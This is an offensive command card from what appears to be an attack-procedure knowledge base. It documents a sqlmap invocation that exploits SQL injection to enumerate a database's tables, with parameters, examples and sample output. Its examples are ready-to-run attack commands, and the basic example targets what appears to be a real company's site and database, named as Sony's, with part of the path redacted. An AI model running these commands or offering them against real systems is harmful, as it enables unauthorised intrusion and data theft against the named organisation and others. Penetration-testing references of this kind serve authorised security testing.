---
data: 'sqlmap -u "http://target.com/vulnerable?param=1" -D database_name --tables'
tags:
  - sql-injection
  - exploitation
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:26.461Z'
id: 7a9c7b2f-3b8d-4a6b-b620-a4c95ad2c41c
verified: false
validated: true
submitted: true
---
# sqlmap-dump-tables

## Command

```bash
sqlmap -u "http://target.com/vulnerable?param=1" -D database_name --tables
```

## Description

This command exploits an SQL injection to dump table names from a specified database, building on initial enumeration to reveal schema details.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-u` | Target URL | Yes |
| `-D` | Specify the database name | Yes |
| `--tables` | Enumerate DBMS database tables | Yes |

## Examples

### Basic Usage

```bash
sqlmap -u "http://sony-website.com/███████?id=1" -D sony_main --tables
```

### Advanced Usage

```bash
sqlmap -u "http://target.com/page?id=1" -D sony_main --tables --batch
```

## Expected Output

List of tables in the database, e.g.,:

```
Database: sony_main
[5 tables]
+------------+
| users      |
| products   |
| orders     |
| admin      |
| logs       |
+------------+
```

## Related

- [[Related Procedure|procedures/Exploit-SQL-Injection-with-SQLMap]]
